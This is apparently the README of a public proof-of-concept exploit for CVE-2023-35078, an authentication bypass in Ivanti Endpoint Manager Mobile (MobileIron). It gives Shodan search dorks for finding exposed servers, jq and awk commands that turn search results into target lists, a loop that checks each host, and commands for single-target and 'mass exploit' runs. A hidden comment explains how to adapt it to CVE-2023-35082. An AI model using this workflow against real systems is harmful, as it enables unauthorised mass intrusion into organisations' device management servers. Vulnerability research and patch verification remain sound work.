# CVE-2023-35078
![](https://img.shields.io/static/v1?label=Product&message=MobileIron&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=Ivanti%20Endpoint%20Manager%20Mobile%20through%2011.10&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%2010.0.%20Authentication%20Bypass&color=red)



- Shodan dorks:
```
http.favicon.hash:362091310
```
```
http.favicon.hash:545827989
```
```
path=/mifs
```
Download the shodan json file and extract all IP addresses from it. You can do this with [shodan-parser](https://github.com/getdrive/POC/blob/main/2023/Ivanti%20Endpoint%20Manager%20Mobile%20(EPMM)/shodan-parser.py) or any other tool.

- Transform shodan json to _data_file_ <br/>
```
jq -cr 'select(.http.favicon.hash == 362091310) | [ if .ssl? then "https://" else "http://" end , (.ip_str) + ":" + (.port|tostring)] | add' shodan.json > data_file
```
```
jq -cr 'select(.http.favicon.hash == 545827989) | [ if .ssl? then "https://" else "http://" end , (.ip_str) + ":" + (.port|tostring)] | add' shodan.json > data_file
```
```
python3 shodan-parser.py -o temp_data_file shodan.json
```
```
awk '{print "https://"$0}' temp_data_file > data_file
```
- How to run a check. <br/>

   The format of the data_file should be as follows: **_http://ip_addr:port_** or **_https://ip_addr:port_** <br/> 
```
chmod +x check.sh; while read line; do ./check.sh $line; done < data_file
```
- Setup requirements <br/>
```
pip install -r requirements.txt
```
- Run exploit single address . <br/>
```
python exploit.py -u http://
```
- Run mass exploit . <br/>
```
python exploit.py -f urls.txt
```
<!-- Here is an Easter Egg for inquiring minds ;-)
 CVE-2023-35082: Just change "aad" to "asfV3" and the exploit works.-->
